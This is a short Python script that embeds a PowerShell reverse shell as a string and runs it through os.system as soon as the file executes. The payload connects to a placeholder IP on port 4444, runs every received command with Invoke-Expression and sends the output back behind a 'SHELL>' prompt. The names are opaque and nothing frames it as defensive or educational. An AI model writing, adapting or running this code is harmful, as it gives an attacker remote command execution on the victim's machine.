import os
import subprocess

A = """
$TCPClient = New-Object Net.Sockets.TCPClient('000.000.0.00', 4444); if ($TCPClient.Connected) { $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream ($String) { [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; $StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush() } WriteToStream ''; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}; WriteToStream ($Output) } $StreamWriter.Close() } else { Write-Output "Error: No se pudo establecer la conexión." }
"""

def BBB():
    os.system(A)

BBB()
